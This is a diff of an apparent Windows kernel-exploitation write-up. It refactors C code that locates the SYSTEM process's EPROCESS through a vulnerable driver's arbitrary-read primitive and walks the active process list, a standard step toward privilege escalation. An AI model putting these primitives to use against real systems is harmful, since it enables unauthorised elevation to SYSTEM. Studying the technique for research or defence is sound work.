@@ -1180,14 +1180,14 @@ PROCESS ffffba09b847a040
 
 </span><span class="na">QWORD GetSystemEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
     </span><span class="na">HMODULE</span><span class="p"> hKernel </span><span class="o">= </span><span class="p">LoadLibraryA(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">ntoskrnl.exe"</span><span class="p">);
-    </span><span class="na">HANDLE</span><span class="p"> psInitialProcess</span><span class="o"> =</span><span class="p"> GetProcAddress(hKernel, </span><span class="s">"PsInitialSystemProcess"</span><span class="p">);  
+    
+    </span><span class="na">QWORD</span><span class="p"> userPsInitialProcess</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) GetProcAddress(hKernel, </span><span class="s">"PsInitialSystemProcess"</span><span class="p">);  
+    </span><span class="na">QWORD</span><span class="p"> offsetPsInitialProcess</span><span class="o"> =</span><span class="p"> userPsInitialProcess</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
+    </span><span class="na">QWORD</span><span class="p"> kernelPsInitialProcess</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> offsetPsInitialProcess;
 
-    </span><span class="na">QWORD</span><span class="p"> psOffset</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) psInitialProcess</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
-    </span><span class="na">QWORD</span><span class="p"> psAddress</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> psOffset;
+    </span><span class="na">QWORD</span><span class="p"> systemEProcess </span><span class="o">=</span><span class="p"> ArbitraryRead(hDevice, kernelPsInitialProcess);
 
-    </span><span class="na">QWORD</span><span class="p"> systemEProcess </span><span class="o">=</span><span class="p"> ArbitraryRead(hDevice, psAddress);
     FreeLibrary(hKernel);
-
     </span><span class="o">return</span><span class="p"> systemEProcess;
 }</span>
 </code></pre></div></div><br>
@@ -1200,7 +1200,7 @@ PROCESS ffffba09b847a040
 
     </span><span class="o">while</span><span class="p"> (</span><span class="mi">TRUE</span><span class="p">) {
         </span><span class="na">QWORD</span><span class="p"> processLinkAddress</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, currentEProcess </span><span class="o">+ </span><span class="p">OFFSET_ActiveProcessLinks);
-        </span><span class="na">QWORD</span><span class="p"> processId</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks </span><span class="o">+</span><span class="p"> OFFSET_UniqueProcessId);
+        </span><span class="na">QWORD</span><span class="p"> processId</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks </span><span class="o">+</span><span class="p"> OFFSET_UniqueProcessId);  
 
         currentEProcess</span><span class="o"> =</span><span class="p"> processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks;
 
@@ -1292,14 +1292,14 @@ PROCESS ffffba09b847a040
 
 </span><span class="na">QWORD GetSystemEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
     </span><span class="na">HMODULE</span><span class="p"> hKernel </span><span class="o">= </span><span class="p">LoadLibraryA(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">ntoskrnl.exe"</span><span class="p">);
-    </span><span class="na">HANDLE</span><span class="p"> psInitialProcess</span><span class="o"> =</span><span class="p"> GetProcAddress(hKernel, </span><span class="s">"PsInitialSystemProcess"</span><span class="p">);
+    
+    </span><span class="na">QWORD</span><span class="p"> userPsInitialProcess</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) GetProcAddress(hKernel, </span><span class="s">"PsInitialSystemProcess"</span><span class="p">);  
+    </span><span class="na">QWORD</span><span class="p"> offsetPsInitialProcess</span><span class="o"> =</span><span class="p"> userPsInitialProcess</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
+    </span><span class="na">QWORD</span><span class="p"> kernelPsInitialProcess</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> offsetPsInitialProcess;
 
-    </span><span class="na">QWORD</span><span class="p"> psOffset</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) psInitialProcess</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
-    </span><span class="na">QWORD</span><span class="p"> psAddress</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> psOffset;
+    </span><span class="na">QWORD</span><span class="p"> systemEProcess </span><span class="o">=</span><span class="p"> ArbitraryRead(hDevice, kernelPsInitialProcess);
 
-    </span><span class="na">QWORD</span><span class="p"> systemEProcess </span><span class="o">=</span><span class="p"> ArbitraryRead(hDevice, psAddress);
     FreeLibrary(hKernel);
-
     </span><span class="o">return</span><span class="p"> systemEProcess;
 }
 
